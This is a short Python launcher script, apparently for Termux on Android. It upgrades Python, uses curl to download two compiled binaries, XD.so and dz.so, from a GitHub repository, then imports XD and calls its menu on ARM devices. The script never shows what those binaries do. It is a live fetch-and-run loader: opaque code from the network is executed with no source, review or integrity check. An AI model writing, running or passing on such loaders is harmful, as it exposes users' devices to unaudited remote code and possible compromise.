import os
os.system('pkg update python && pkg upgrade python')
from os import path,system
from platform import uname
arch=uname().machine.lower()
if path.isfile("XD.so"):
    pass
else:
    system("curl -L https://raw.githubusercontent.com/abubolojani/okxd/main/XD.so -o XD.so")
if path.isfile("dz.so"):
    pass
else:
    system("curl -L https://raw.githubusercontent.com/abubolojani/okxd/main/dz.so -o dz.so")

if 'aarch' in arch:
    arch = 'aarch'
    print('\033[1;32m\nCongratulatings! Your Deviec Support This Tools')
    import XD
    XD.menu()
else:exit('\033[1;31m Sorry System or device not supported ')
    
